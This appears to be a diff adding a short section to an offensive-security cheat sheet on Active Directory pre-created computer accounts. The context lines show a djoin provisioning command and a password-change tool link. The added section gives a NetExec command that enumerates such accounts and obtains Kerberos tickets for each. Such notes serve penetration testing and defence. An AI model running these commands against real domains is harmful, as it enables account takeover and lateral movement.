@@ -12,6 +12,15 @@ djoin /PROVISION /DOMAIN <fqdn> /MACHINE evilpc /SAVEFILE C:\temp\evilpc.txt /DE
 * Then you need to change the password with [rpcchangepwd.py](https://github.com/SecureAuthCorp/impacket/pull/1304)
 
 
+## Enumerate Pre-Created Computer Account
+
+Identify pre-created computer accounts, save the results to a file, and obtain TGTs for each
+
+```ps1
+nxc -u username -p password -M pre2K
+```
+
+
 ## References
 
 * [DIVING INTO PRE-CREATED COMPUTER ACCOUNTS - May 10, 2022 - By Oddvar Moe](https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/)
